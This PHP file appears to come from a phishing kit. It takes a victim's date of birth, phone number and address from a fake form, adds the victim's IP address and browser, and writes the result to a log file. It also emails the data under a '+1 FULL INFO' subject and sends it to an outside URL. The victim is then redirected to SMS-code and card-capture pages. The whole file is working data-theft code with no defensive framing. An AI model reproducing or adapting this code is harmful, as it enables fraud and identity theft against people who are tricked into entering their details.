<?php
  error_reporting(0);
  ob_start();
  session_start();

include '../../antibots.php';
include '../../config.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
		$_SESSION["DOB"]		= $_POST["dob"];
		$_SESSION["PhoneNumber"]= $_POST["phone"];
		$_SESSION["street"] 	= $_POST["address1"];
		$_SESSION["city"]		= $_POST["city"];
		$_SESSION["country"] 	= $_POST["country"];
		$_SESSION["ZIP"] 		= $_POST["ZIP"];
$message = '
_______________________________
DDN : '.$_SESSION["DOB"].'
TEL : '.$_SESSION["PhoneNumber"].'
-
Rue : '.$_SESSION["street"].'
Ville : '.$_SESSION["city"].'
Code Postal : '.$_SESSION["ZIP"].'
Pays : '.$_SESSION["country"].'
_______________________________
IP: '._ip().'
User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
';
$Subject=" \xF0\x9F\x92\xA4 +1 FULL INFO \xF0\x9F\x92\xA4 | "._ip();
$head="From: \xF0\x9F\x8C\x8C ISK 17 \xF0\x9F\x8C\x8C <rez@ayz.com>";

$fil = fopen('fullinfos_ayz.txt', 'a+');
fwrite($fil, '####################'.$message.'####################');
$_SESSION['step_three']  = true;
mail($my_mail,$Subject,$message,$head);
file_get_contents($urls . urlencode($message));
if ($inc == "oui") {
header('location:  ../sms-auth0.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}else{
    header('location: ../card.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}
}
?>
